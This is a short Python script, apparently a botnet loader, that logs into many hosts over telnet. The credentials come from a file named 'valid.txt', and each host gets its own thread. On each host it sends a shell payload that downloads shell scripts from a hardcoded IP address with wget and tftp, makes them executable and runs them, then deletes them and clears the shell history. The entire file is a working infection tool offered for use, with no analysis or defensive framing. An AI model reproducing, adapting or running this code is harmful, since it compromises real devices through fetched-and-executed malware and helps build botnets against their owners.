import telnetlib
import threading

PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.146.253.213/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 45.146.253.213 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"

def infect(ip, port, user, passwd):
    try:
        print(f"[+] Connecting to {ip}")
        tn = telnetlib.Telnet(ip, port, timeout=10)
        tn.read_until(b"login: ")
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(passwd.encode('ascii') + b"\n")
        
        index, _, _ = tn.expect([b"#", b">", b"$"], timeout=5)
        if index >= 0:
            print(f"[+] Logged in to {ip}, sending payload...")
            tn.write(PAYLOAD.encode('ascii') + b"\n")
            tn.write(b"exit\n")
        tn.close()
    except Exception as e:
        print(f"[-] Failed on {ip}: {e}")

def load_targets(file):
    with open(file, "r") as f:
        lines = f.read().splitlines()
        for line in lines:
            try:
                hostpart, credpart = line.strip().split()
                ip, port = hostpart.split(":")
                user, passwd = credpart.split(":")
                threading.Thread(target=infect, args=(ip, int(port), user, passwd)).start()
            except Exception as e:
                print(f"[-] Skipping line due to error: {e}")

if __name__ == "__main__":
    load_targets("valid.txt")
